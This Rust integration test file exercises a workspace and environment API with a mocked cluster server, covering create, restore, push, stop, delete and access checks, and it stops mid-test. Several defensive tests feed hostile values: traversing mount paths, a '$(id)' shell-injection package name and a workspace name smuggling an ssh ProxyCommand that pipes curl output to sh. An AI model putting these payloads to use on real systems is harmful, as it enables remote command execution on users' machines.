//! User-facing `/v1` workspaces/environments/regions routes, in-process against a mocked API
//! server (`kube_test`) for the cluster half and `MemStore` for the region half.
//!
//! Every mutation's whole output is an object in the API server, so the assertions are about what
//! the handler POSTed or PATCHed, read back off the mock's recorder.

use rustic_git_core::jwt::Jwt;
use rustic_git_workspaces::api::{router, ApiState, Directory};
use rustic_git_workspaces::kube_test::{get, mock_client, post, stub_registry, Recorder, Route};
use rustic_git_workspaces::upstream::Upstream;
use rustic_git_workspaces::store::{MemStore, MetaStore};
use serde_json::{json, Value};
use std::collections::HashSet;
use std::sync::Arc;

const API: &str = "/apis/rustic-git.io/v1alpha1";
const NODE: &str = "node-a";

struct Server {
    base: String,
    store: Arc<MemStore>,
    jwt: Arc<Jwt>,
    rec: Recorder,
}

fn vol_obj(name: &str, owner: &str) -> Value {
    json!({
        "apiVersion": "rustic-git.io/v1alpha1", "kind": "Volume",
        "metadata": {"name": name, "labels": {"rustic-git.io/owner": owner, "rustic-git.io/kind": "workspace"}},
        "spec": {"owner": owner, "nodeName": NODE, "region": "centralindia", "quotaGb": 20}
    })
}

/// A `Workspace` as the API server echoes it back: `spec.storage`, no node and no `volumeRef` —
/// both of those are facts the controllers report in status.
fn ws_obj(name: &str, owner: &str) -> Value {
    json!({
        "apiVersion": "rustic-git.io/v1alpha1", "kind": "Workspace",
        "metadata": {"name": name, "labels": {"rustic-git.io/owner": owner}},
        "spec": {
            "owner": owner, "team": "", "name": name, "region": "centralindia", "image": "nginx:alpine",
            "storage": {"quotaGb": 20}, "desiredState": "running"
        }
    })
}

/// The same, once a node has claimed it and created its Volume.
fn placed_ws(name: &str, owner: &str) -> Value {
    let mut w = ws_obj(name, owner);
    w["status"] = json!({"phase": "ready", "nodeName": NODE, "compatibleNodes": [NODE], "volumeRef": name});
    w
}

/// A freshly created `Environment`: no status, because no controller has seen it yet.
fn new_env(name: &str, owner: &str) -> Value {
    json!({
        "apiVersion": "rustic-git.io/v1alpha1", "kind": "Environment",
        "metadata": {"name": name, "labels": {"rustic-git.io/owner": owner}},
        "spec": {
            "owner": owner, "name": name, "region": "centralindia", "services": [],
            "storage": {"quotaGb": 20}, "desiredState": "running"
        }
    })
}

fn env_obj(name: &str, owner: &str) -> Value {
    let mut e = new_env(name, owner);
    e["status"] = json!({"phase": "running", "nodeName": NODE, "volumeRef": name});
    e
}

/// Creating, cloning and restoring all list the owner's workspaces in the target team first to
/// refuse a taken name; most tests have none.
fn no_workspaces() -> Route {
    get(format!("{API}/workspaces"), json!({"apiVersion": "rustic-git.io/v1alpha1", "kind": "WorkspaceList", "metadata": {}, "items": []}))
}

/// The ONE write a create makes now.
fn create_routes() -> Vec<Route> {
    vec![
        no_workspaces(),
        post(format!("{API}/workspaces"), ws_obj("ws-new", "karthik")),
        post(format!("{API}/environments"), new_env("env-new", "karthik")),
    ]
}

async fn server_with(admins: &[&str], routes: Option<Vec<Route>>) -> Server {
    let store = Arc::new(MemStore::new());
    region(&store, "centralindia").await;
    let jwt = Arc::new(Jwt::new("test-secret-at-least-32-bytes-long!!").unwrap());
    let mut state = ApiState::new(
        store.clone() as Arc<dyn MetaStore>,
        jwt.clone(),
        admins.iter().map(|s| s.to_string()).collect::<HashSet<_>>(),
    );
    let rec = match routes {
        Some(routes) => {
            let (client, rec) = mock_client(routes);
            state = state.with_kube(client);
            rec
        }
        None => Recorder::default(),
    };
    let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = l.local_addr().unwrap();
    let app = router(Arc::new(state));
    tokio::spawn(async move { axum::serve(l, app).await.unwrap() });
    Server { base: format!("http://{addr}"), store, jwt, rec }
}

async fn server(routes: Vec<Route>) -> Server {
    server_with(&[], Some(routes)).await
}

/// The same, plus a stand-in server tier — needed by every route that reads snapshots, since those
/// records do not live in the cluster.
async fn server_with_registry(routes: Vec<Route>, registry_base: String) -> Server {
    let store = Arc::new(MemStore::new());
    region(&store, "centralindia").await;
    let jwt = Arc::new(Jwt::new("test-secret-at-least-32-bytes-long!!").unwrap());
    let (client, rec) = mock_client(routes);
    let state = ApiState::new(store.clone() as Arc<dyn MetaStore>, jwt.clone(), HashSet::new())
        .with_kube(client)
        .with_upstream(Arc::new(Upstream::new(registry_base, "peer-secret")));
    let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = l.local_addr().unwrap();
    let app = router(Arc::new(state));
    tokio::spawn(async move { axum::serve(l, app).await.unwrap() });
    Server { base: format!("http://{addr}"), store, jwt, rec }
}

/// `karthik` is the only member of team `acme` — enough to prove that team membership does not
/// reach another member's WORKSPACE snapshots.
struct StubMembership;

#[async_trait::async_trait]
impl Directory for StubMembership {
    async fn teams_for(&self, user: &str) -> Vec<String> {
        if user == "karthik" { vec!["acme".into()] } else { vec![] }
    }
}

async fn server_with_teams(routes: Vec<Route>, registry_base: String) -> Server {
    let store = Arc::new(MemStore::new());
    region(&store, "centralindia").await;
    let jwt = Arc::new(Jwt::new("test-secret-at-least-32-bytes-long!!").unwrap());
    let (client, rec) = mock_client(routes);
    let state = ApiState::new(store.clone() as Arc<dyn MetaStore>, jwt.clone(), HashSet::new())
        .with_kube(client)
        .with_directory(Arc::new(StubMembership))
        .with_upstream(Arc::new(Upstream::new(registry_base, "peer-secret")));
    let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = l.local_addr().unwrap();
    let app = router(Arc::new(state));
    tokio::spawn(async move { axum::serve(l, app).await.unwrap() });
    Server { base: format!("http://{addr}"), store, jwt, rec }
}

/// A workspace's snapshots are its OWNER's undo history, not a team artifact: workspace volumes
/// live under the person's own owner label, never a team's, so a teammate searching for the id
/// finds nothing and gets the same 404 a stranger does. (Environment volumes ARE team-scoped —
/// that asymmetry is the product rule, and this is the test that keeps it true.)
#[tokio::test]
async fn a_teammate_cannot_restore_another_members_workspace_snapshot() {
    let up = stub_registry(
        // Neither the caller's own label nor their team's holds bob's volume.
        vec![("karthik", json!([])), ("acme", json!([]))],
        vec![(
            "bob/ws-bob",
            json!([{"id": "snap-bob", "state": null, "lineage": [],
                    "region": "centralindia", "created_at": "2026-08-27T09:00:00Z"}]),
        )],
    )
    .await;
    let s = server_with_teams(vec![], up).await;

    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces/restore", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .json(&json!({"name": "not-mine", "snapshot_id": "snap-bob"}))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 404, "{}", resp.text().await.unwrap());
    assert!(s.rec.sent("POST", &format!("{API}/workspaces")).is_empty(), "nothing written");
}

fn token(jwt: &Jwt, username: &str) -> String {
    jwt.mint(&format!("{username}@example.com"), "Test User", Some(username)).unwrap()
}

async fn region(store: &MemStore, id: &str) {
    store
        .put_region(&rustic_git_workspaces::model::Region {
            id: id.into(),
            name: id.into(),
            storage_account: "acct".into(),
            blob_container: "wslayers".into(),
            status: "active".into(),
        })
        .await
        .unwrap();
}

/// One object per user action. The API used to write two and pick a node; both are the
/// controllers' now, and the node it would have picked is a fact it has no way to know yet.
#[tokio::test]
async fn create_ws_writes_exactly_one_unplaced_workspace() {
    let s = server(create_routes()).await;
    let tok = token(&s.jwt, "karthik");
    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces", s.base))
        .bearer_auth(&tok)
        .json(&json!({"name": "web", "region": "centralindia", "quota_gb": 20, "image": "nginx:alpine"}))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 202, "{}", resp.text().await.unwrap());

    let calls = s.rec.calls();
    assert!(!calls.iter().any(|c| c.contains("/volumes")), "the API never creates a Volume: {calls:?}");
    assert!(!calls.iter().any(|c| c.contains("ownerbindings")), "the API never places: {calls:?}");
    assert!(!calls.iter().any(|c| c.contains("/nodes")), "and never reads node capacity: {calls:?}");
    let w = &s.rec.sent("POST", &format!("{API}/workspaces"))[0];
    assert_eq!(w["spec"]["name"], "web");
    assert_eq!(w["spec"]["desiredState"], "running");
    assert_eq!(w["spec"]["storage"]["quotaGb"], 20);
    assert!(w["spec"]["storage"]["source"].is_null(), "a fresh workspace has no source volume");
    // audit H1, in its controller-ownership form: the Volume's node comes from its parent's
    // status, which is now a controller invariant. The API's half is writing NO node at all —
    // two places allowed to name one is two places that can disagree about where the data is.
    assert!(w["spec"].get("nodeName").is_none(), "placement is a fact the controllers establish: {w}");
    assert!(w["spec"].get("volumeRef").is_none(), "a volumeRef in spec was a wish about a fact: {w}");
    assert_eq!(w["metadata"]["labels"]["rustic-git.io/owner"], "karthik");
}



/// An unnamed restore is refused before anything is written, the same as a create.
#[tokio::test]
async fn an_environment_restore_refuses_an_empty_name() {
    let s = server_with_registry(vec![], stub_registry(vec![], vec![]).await).await;
    let resp = reqwest::Client::new()
        .post(format!("{}/v1/environments/restore", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .json(&json!({"name": "  ", "snapshot_id": "snap-env"}))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 422, "{}", resp.text().await.unwrap());
    assert!(s.rec.sent("POST", &format!("{API}/environments")).is_empty(), "nothing written");
}

/// `check_services` is the trust boundary for mounts and a restore is just as much a caller-authored
/// service list as a create is — an escaping mount must not get in through the new door.
#[tokio::test]
async fn an_environment_restore_refuses_an_escaping_mount() {
    let s = server_with_registry(vec![], stub_registry(vec![], vec![]).await).await;
    let resp = reqwest::Client::new()
        .post(format!("{}/v1/environments/restore", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .json(&json!({
            "name": "bad",
            "snapshot_id": "snap-env",
            "services": [{"name": "x", "image": "alpine", "command": [], "env": {}, "mounts": [{"folder": "../../etc", "path": "/etc"}]}]
        }))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 400, "{}", resp.text().await.unwrap());
    assert!(s.rec.sent("POST", &format!("{API}/environments")).is_empty(), "nothing written");
}


/// A snapshot id in nobody's history the caller can read is a 404, and nothing is written — the
/// same answer another owner's snapshot id gets, deliberately indistinguishable.
#[tokio::test]
async fn restore_of_an_unknown_or_foreign_snapshot_is_not_found() {
    let up = stub_registry(
        vec![("karthik", json!([{"name": "ws-mine", "latest_ms": 1i64}])),
             ("alice", json!([{"name": "ws-hers", "latest_ms": 1i64}]))],
        vec![
            ("karthik/ws-mine", json!([{"id": "snap-mine", "state": null, "lineage": [],
                                        "region": "centralindia", "created_at": "2026-08-27T09:00:00Z"}])),
            ("alice/ws-hers", json!([{"id": "snap-hers", "state": null, "lineage": [],
                                      "region": "centralindia", "created_at": "2026-08-27T09:00:00Z"}])),
        ],
    )
    .await;
    let s = server_with_registry(vec![], up).await;
    let tok = token(&s.jwt, "karthik");

    for id in ["nope", "snap-hers"] {
        let resp = reqwest::Client::new()
            .post(format!("{}/v1/workspaces/restore", s.base))
            .bearer_auth(&tok)
            .json(&json!({"name": "web-old", "snapshot_id": id}))
            .send()
            .await
            .unwrap();
        assert_eq!(resp.status(), 404, "snapshot id {id}");
    }
    assert!(!s.rec.calls().iter().any(|c| c.starts_with("POST")));
}

#[tokio::test]
async fn start_and_stop_patch_the_desired_state() {
    let routes = vec![
        get(format!("{API}/workspaces/ws-1"), placed_ws("ws-1", "karthik")),
        Route { method: "PATCH", path: format!("{API}/workspaces/ws-1"), status: 200, body: placed_ws("ws-1", "karthik") },
    ];
    let s = server(routes).await;
    let tok = token(&s.jwt, "karthik");
    let client = reqwest::Client::new();

    for (verb, want) in [("stop", "stopped"), ("start", "running")] {
        let resp = client
            .post(format!("{}/v1/workspaces/ws-1/{verb}", s.base))
            .bearer_auth(&tok)
            .send()
            .await
            .unwrap();
        assert_eq!(resp.status(), 202);
        let patch = s.rec.sent("PATCH", &format!("{API}/workspaces/ws-1")).pop().unwrap();
        assert_eq!(patch["spec"]["desiredState"], want);
    }
}

/// A `NodeDead` condition on the parent's status is what makes stopping it a real decision — the
/// person is choosing to lose whatever the dead node holds since the last sync point — so the
/// response has to say so, and only then.
fn with_node_dead(mut w: Value) -> Value {
    w["status"]["conditions"] = json!([
        {"type": "Degraded", "status": "True", "reason": "NodeDead", "message": "node down",
         "observedGeneration": 1, "lastTransitionTime": "2026-09-01T00:00:00Z"}
    ]);
    w
}

#[tokio::test]
async fn stop_warns_only_when_the_workspace_is_pinned_to_a_dead_node() {
    let dead = with_node_dead(placed_ws("ws-1", "karthik"));
    let routes = vec![
        get(format!("{API}/workspaces/ws-1"), dead),
        Route { method: "PATCH", path: format!("{API}/workspaces/ws-1"), status: 200, body: placed_ws("ws-1", "karthik") },
    ];
    let s = server(routes).await;
    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces/ws-1/stop", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 202);
    let body: Value = resp.json().await.unwrap();
    let warning = body["warning"].as_str().expect("a workspace pinned to a dead node must warn on stop");
    assert!(warning.contains(NODE), "warning must name the dead node: {warning}");
    assert!(warning.contains("will not follow the move"));

    // A healthy workspace: same route, no `NodeDead` condition — no warning key at all, but the
    // body still parses as JSON (a body-less 202 throws in the web client's `res.json()`).
    let routes = vec![
        get(format!("{API}/workspaces/ws-1"), placed_ws("ws-1", "karthik")),
        Route { method: "PATCH", path: format!("{API}/workspaces/ws-1"), status: 200, body: placed_ws("ws-1", "karthik") },
    ];
    let s = server(routes).await;
    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces/ws-1/stop", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 202);
    let body: Value = resp.json().await.unwrap();
    assert!(body.get("warning").is_none(), "a healthy workspace must not get a manufactured warning: {body}");
}

#[tokio::test]
async fn stop_env_keeps_the_doc_fields_alongside_the_warning() {
    let dead = with_node_dead(env_obj("env-1", "karthik"));
    let routes = vec![
        get(format!("{API}/environments/env-1"), dead),
        Route { method: "PATCH", path: format!("{API}/environments/env-1"), status: 200, body: env_obj("env-1", "karthik") },
    ];
    let s = server(routes).await;
    let resp = reqwest::Client::new()
        .post(format!("{}/v1/environments/env-1/stop", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 202);
    let body: Value = resp.json().await.unwrap();
    let warning = body["warning"].as_str().expect("an environment pinned to a dead node must warn on stop");
    assert!(warning.contains(NODE));
    // The warning rides alongside the environment doc, not instead of it.
    assert_eq!(body["id"], "env-1");
    assert_eq!(body["state"], "stopped");

    let routes = vec![
        get(format!("{API}/environments/env-1"), env_obj("env-1", "karthik")),
        Route { method: "PATCH", path: format!("{API}/environments/env-1"), status: 200, body: env_obj("env-1", "karthik") },
    ];
    let s = server(routes).await;
    let resp = reqwest::Client::new()
        .post(format!("{}/v1/environments/env-1/stop", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 202);
    let body: Value = resp.json().await.unwrap();
    assert!(body.get("warning").is_none(), "a healthy environment must not get a manufactured warning: {body}");
    assert_eq!(body["id"], "env-1");
}

/// Delete is ONE call. The "Workspace first, then Volume" ordering became the API server's job the
/// moment the Volume got an ownerReference.
#[tokio::test]
async fn delete_is_one_call() {
    let routes = vec![
        get(format!("{API}/workspaces/ws-1"), placed_ws("ws-1", "karthik")),
        Route { method: "DELETE", path: format!("{API}/workspaces/ws-1"), status: 200, body: placed_ws("ws-1", "karthik") },
    ];
    let s = server(routes).await;

    let resp = reqwest::Client::new()
        .delete(format!("{}/v1/workspaces/ws-1", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 202, "{}", resp.text().await.unwrap());
    let deletes: Vec<_> = s.rec.calls().into_iter().filter(|c| c.starts_with("DELETE")).collect();
    assert_eq!(deletes, vec![format!("DELETE {API}/workspaces/ws-1")], "the GC removes the Volume");
}

#[tokio::test]
async fn missing_token_is_unauthorized() {
    let s = server(vec![
    ]).await;
    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces", s.base))
        .json(&json!({"name": "web", "region": "centralindia", "quota_gb": 20}))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 401);
}

#[tokio::test]
async fn wrong_token_is_unauthorized() {
    let s = server(vec![]).await;
    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces", s.base))
        .bearer_auth("not-a-real-token")
        .json(&json!({"name": "web", "region": "centralindia", "quota_gb": 20}))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 401);
}

/// No cluster configured (dev, or no kubeconfig) — workspace routes answer 503, not a 404 that
/// would read as "this feature doesn't exist".
#[tokio::test]
async fn workspace_routes_without_a_cluster_are_503() {
    let s = server_with(&[], None).await;
    let tok = token(&s.jwt, "karthik");
    let client = reqwest::Client::new();

    let resp = client
        .post(format!("{}/v1/workspaces", s.base))
        .bearer_auth(&tok)
        .json(&json!({"name": "web", "region": "centralindia", "quota_gb": 20}))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 503);

    let resp = client.get(format!("{}/v1/workspaces", s.base)).bearer_auth(&tok).send().await.unwrap();
    assert_eq!(resp.status(), 503);

    let resp = client.get(format!("{}/v1/environments", s.base)).bearer_auth(&tok).send().await.unwrap();
    assert_eq!(resp.status(), 503);
}

#[tokio::test]
async fn region_create_requires_admin() {
    let s = server_with(&["admin@example.com"], None).await;
    let client = reqwest::Client::new();

    let non_admin = token(&s.jwt, "karthik");
    let resp = client
        .post(format!("{}/v1/regions", s.base))
        .bearer_auth(&non_admin)
        .json(&json!({"id": "centralindia", "name": "Central India", "storage_account": "a", "blob_container": "b"}))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 403);

    let admin = token(&s.jwt, "admin");
    let resp = client
        .post(format!("{}/v1/regions", s.base))
        .bearer_auth(&admin)
        .json(&json!({"id": "centralindia", "name": "Central India", "storage_account": "a", "blob_container": "b"}))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 201);
}

/// Same rule as `create_ws`, on the environment side.
#[tokio::test]
async fn create_env_writes_exactly_one_unplaced_environment() {
    let s = server(create_routes()).await;
    region(&s.store, "centralindia").await;
    let tok = token(&s.jwt, "karthik");

    let resp = reqwest::Client::new()
        .post(format!("{}/v1/environments", s.base))
        .bearer_auth(&tok)
        .json(&json!({"name": "app-dev", "region": "centralindia", "services": []}))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 202, "{}", resp.text().await.unwrap());
    let doc: Value = resp.json().await.unwrap();
    assert_eq!(doc["state"], "creating", "an object the controller has not seen yet has no status");

    assert!(!s.rec.calls().iter().any(|c| c.contains("/volumes")), "the API never creates a Volume");
    let e = s.rec.sent("POST", &format!("{API}/environments")).remove(0);
    assert_eq!(e["spec"]["name"], "app-dev");
    assert_eq!(e["spec"]["desiredState"], "running");
    assert_eq!(e["metadata"]["labels"]["rustic-git.io/kind"], "environment");
    assert!(e["spec"].get("nodeName").is_none(), "placement is the controllers': {e}");
}

/// The C1 fix: a traversing mount is refused BEFORE anything is written, so a root controller
/// never sees one.
#[tokio::test]
async fn a_traversing_mount_is_refused_before_any_object_is_written() {
    let s = server(create_routes()).await;
    let tok = token(&s.jwt, "karthik");

    let resp = reqwest::Client::new()
        .post(format!("{}/v1/environments", s.base))
        .bearer_auth(&tok)
        .json(&json!({
            "name": "app-dev", "region": "centralindia",
            "services": [{"name": "web", "image": "nginx", "command": [], "env": {}, "ports": [],
                          "mounts": [{"folder": "/", "path": "/host"}]}]
        }))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 400);
    assert!(s.rec.calls().is_empty(), "nothing may be written before the mount check");
}

/// The agent work surface (register/work/jobs/{id}/done|failed) lives on the server tier
/// (`bins/server`'s `/vol-agent/*`) — this router never mounted it.
#[tokio::test]
async fn agent_routes_are_gone_from_the_api_router() {
    let s = server(vec![]).await;
    let resp = reqwest::Client::new().post(format!("{}/v1/agent/register", s.base)).send().await.unwrap();
    assert_eq!(resp.status(), 404);
}

// ── push ─────────────────────────────────────────────────────────────────

/// A created `Snapshot` as the API server echoes it back.
fn snap_obj() -> serde_json::Value {
    json!({
        "apiVersion": "rustic-git.io/v1alpha1", "kind": "Snapshot",
        "metadata": {"name": "ws-1-abcdef01"},
        "spec": {"volume": "ws-1", "owner": "karthik", "worktree": "ws-1", "parent": "", "pinned": false},
        "status": {"phase": "working"},
    })
}

/// Push is still the one mutating verb; the OBJECT is the work item now — a `Snapshot` CR, created
/// `Working` so the agent can act on the very first reconcile pass. The volume it names is the
/// subvolume that gets committed, and the owner is read off that volume, never off the caller.
#[tokio::test]
async fn push_creates_a_snapshot_for_the_volume_with_its_message() {
    let routes = vec![
        get(format!("{API}/workspaces/ws-1"), placed_ws("ws-1", "karthik")),
        get(format!("{API}/volumes/ws-1"), vol_obj("ws-1", "karthik")),
        get(format!("{API}/snapshots"), json!({"apiVersion": "rustic-git.io/v1alpha1", "kind": "SnapshotList", "items": []})),
        Route { method: "POST", path: format!("{API}/snapshots"), status: 201, body: snap_obj() },
    ];
    let s = server(routes).await;
    let tok = token(&s.jwt, "karthik");

    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces/ws-1/push", s.base))
        .bearer_auth(&tok)
        .json(&json!({"message": "checkpoint"}))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 202, "{}", resp.text().await.unwrap());

    let req = s.rec.sent("POST", &format!("{API}/snapshots")).remove(0);
    assert_eq!(req["spec"]["volume"], "ws-1");
    assert_eq!(req["spec"]["worktree"], "ws-1");
    assert_eq!(req["spec"]["message"], "checkpoint");
    assert_eq!(req["metadata"]["labels"]["rustic-git.io/volume"], "ws-1");
    assert_eq!(req["metadata"]["labels"]["rustic-git.io/owner"], "karthik");
    assert_eq!(req["status"]["phase"], "working");
}

#[tokio::test]
async fn push_with_no_body_omits_the_message() {
    let routes = vec![
        get(format!("{API}/workspaces/ws-1"), placed_ws("ws-1", "karthik")),
        get(format!("{API}/volumes/ws-1"), vol_obj("ws-1", "karthik")),
        get(format!("{API}/snapshots"), json!({"apiVersion": "rustic-git.io/v1alpha1", "kind": "SnapshotList", "items": []})),
        Route { method: "POST", path: format!("{API}/snapshots"), status: 201, body: snap_obj() },
    ];
    let s = server(routes).await;
    let tok = token(&s.jwt, "karthik");

    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces/ws-1/push", s.base))
        .bearer_auth(&tok)
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 202);
    let req = s.rec.sent("POST", &format!("{API}/snapshots")).remove(0);
    assert!(req["spec"].get("message").is_none());
}

#[tokio::test]
async fn env_push_targets_the_environments_own_volume() {
    let routes = vec![
        get(format!("{API}/environments/env-1"), env_obj("env-1", "karthik")),
        get(format!("{API}/volumes/env-1"), vol_obj("env-1", "karthik")),
        get(format!("{API}/snapshots"), json!({"apiVersion": "rustic-git.io/v1alpha1", "kind": "SnapshotList", "items": []})),
        Route { method: "POST", path: format!("{API}/snapshots"), status: 201, body: snap_obj() },
    ];
    let s = server(routes).await;
    let tok = token(&s.jwt, "karthik");

    let resp = reqwest::Client::new()
        .post(format!("{}/v1/environments/env-1/push", s.base))
        .bearer_auth(&tok)
        .json(&json!({"message": "snap"}))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 202, "{}", resp.text().await.unwrap());
    let req = s.rec.sent("POST", &format!("{API}/snapshots")).remove(0);
    assert_eq!(req["spec"]["volume"], "env-1");
    assert_eq!(req["spec"]["message"], "snap");
}

/// Someone else's workspace is a 404, never a 403 — and no request object is created.
#[tokio::test]
async fn push_on_someone_elses_workspace_is_not_found() {
    let routes = vec![get(format!("{API}/workspaces/ws-1"), placed_ws("ws-1", "alice"))];
    let s = server(routes).await;
    let tok = token(&s.jwt, "karthik");

    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces/ws-1/push", s.base))
        .bearer_auth(&tok)
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 404);
    assert!(!s.rec.calls().iter().any(|c| c.starts_with("POST")));
}

/// A workspace whose Volume does not exist yet cannot be pushed. 409 "not ready yet", not a 500 and
/// not a silently dropped request.
#[tokio::test]
async fn push_before_the_volume_exists_is_a_conflict() {
    let s = server(vec![get(format!("{API}/workspaces/ws-1"), ws_obj("ws-1", "karthik"))]).await;
    let tok = token(&s.jwt, "karthik");
    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces/ws-1/push", s.base))
        .bearer_auth(&tok)
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 409);
    assert!(!s.rec.calls().iter().any(|c| c.starts_with("POST")), "no request object for a volume-less push");
}

/// The retry the create's 5 s placement wait defers to. Seeded pods REQUIRE the key mount, so a
/// user whose very first workspace outran its namespace has to get the key on some later request —
/// and a list is the one request every client makes.
#[tokio::test]
async fn listing_reinstalls_the_platform_key_when_the_namespace_secret_is_missing() {
    let tmp = tempfile::tempdir().unwrap();
    let keys = Arc::new(
        rustic_git_storage::store::Store::open(
            Arc::new(object_store::memory::InMemory::new()),
            tmp.path().join("cache"),
            false,
        )
        .await
        .unwrap(),
    );
    keys.rotate_user_key("karthik", "PRIVATE KEY", "SHA256:abc", None).await.unwrap();

    let list = json!({
        "apiVersion": "rustic-git.io/v1alpha1", "kind": "WorkspaceList", "metadata": {},
        "items": [placed_ws("ws-1", "karthik")]
    });
    // No route for the Secret GET: the mock 404s it, which is exactly "the namespace has no key".
    let routes = vec![
        get(format!("{API}/workspaces"), list),
        get(format!("{API}/snapshots"), json!({
            "apiVersion": "rustic-git.io/v1alpha1", "kind": "SnapshotList", "metadata": {}, "items": []
        })),
        Route {
            method: "PATCH",
            path: "/api/v1/namespaces/ws-karthik/secrets/user-key".into(),
            status: 200,
            body: json!({"apiVersion": "v1", "kind": "Secret", "metadata": {"name": "user-key"}}),
        },
    ];
    let store = Arc::new(MemStore::new());
    region(&store, "centralindia").await;
    let jwt = Arc::new(Jwt::new("test-secret-at-least-32-bytes-long!!").unwrap());
    let (client, rec) = mock_client(routes);
    let state = ApiState::new(store as Arc<dyn MetaStore>, jwt.clone(), HashSet::new())
        .with_kube(client)
        .with_keys(keys)
        .with_directory(Arc::new(StubKeys));
    let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = l.local_addr().unwrap();
    tokio::spawn(async move { axum::serve(l, router(Arc::new(state))).await.unwrap() });

    let resp = reqwest::Client::new()
        .get(format!("http://{addr}/v1/workspaces"))
        .bearer_auth(token(&jwt, "karthik"))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 200, "{}", resp.text().await.unwrap());
    let calls = rec.calls();
    assert!(
        calls.iter().any(|c| c == "PATCH /api/v1/namespaces/ws-karthik/secrets/user-key"),
        "the absent Secret is re-installed on list: {calls:?}"
    );
}

/// The API is one of the two places `spec.packages` is checked (the reconciler is the other, and
/// the one that matters); a shell-injection payload must never reach the object.
#[tokio::test]
async fn create_refuses_a_package_that_is_not_an_attribute_name() {
    let s = server(create_routes()).await;
    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .json(&json!({"name": "web", "region": "centralindia", "quota_gb": 20, "packages": ["$(id)"]}))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 422);
    let body: Value = resp.json().await.unwrap();
    assert!(body["error"].as_str().unwrap().contains("$(id)"), "{body}");
    assert!(s.rec.calls().is_empty(), "a refused create writes nothing");
}

/// The name lands verbatim in generated ssh config on every TEAMMATE's machine, so a newline in
/// it is remote command execution on their box, not a cosmetic problem.
#[tokio::test]
async fn create_refuses_a_name_that_would_inject_ssh_config() {
    let s = server(create_routes()).await;
    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .json(&json!({
            "name": "web\n  ProxyCommand /bin/sh -c 'curl x|sh'\nHost *",
            "region": "centralindia", "quota_gb": 20
        }))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 422);
    let body: Value = resp.json().await.unwrap();
    assert!(body["error"].as_str().unwrap().contains("name must be"), "{body}");
    assert!(s.rec.calls().is_empty(), "a refused create writes nothing");
}

#[tokio::test]
async fn create_writes_the_requested_packages() {
    let s = server(create_routes()).await;
    let resp = reqwest::Client::new()
        .post(format!("{}/v1/workspaces", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .json(&json!({"name": "web", "region": "centralindia", "quota_gb": 20, "packages": ["hello"]}))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 202, "{}", resp.text().await.unwrap());
    let w = &s.rec.sent("POST", &format!("{API}/workspaces"))[0];
    assert_eq!(w["spec"]["packages"], json!(["hello"]));
}

#[tokio::test]
async fn patch_merges_the_package_list_and_echoes_the_doc() {
    let mut patched = placed_ws("ws-1", "karthik");
    patched["spec"]["packages"] = json!(["hello", "jq"]);
    let routes = vec![
        get(format!("{API}/workspaces/ws-1"), placed_ws("ws-1", "karthik")),
        Route { method: "PATCH", path: format!("{API}/workspaces/ws-1"), status: 200, body: patched },
    ];
    let s = server(routes).await;

    let resp = reqwest::Client::new()
        .patch(format!("{}/v1/workspaces/ws-1", s.base))
        .bearer_auth(token(&s.jwt, "karthik"))
        .json(&json!({"packages": ["hello", "jq"]}))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 200, "{}", resp.text().await.unwrap());
    let doc: Value = resp.json().await.unwrap();
    assert_eq!(doc["packages"], json!(["hello", "jq"]));
    // A merge patch, not an apply: it must touch `spec.packages` and nothing else.
    let p = s.rec.sent("PATCH", &format!("{API}/workspaces/ws-1")).pop().unwrap();
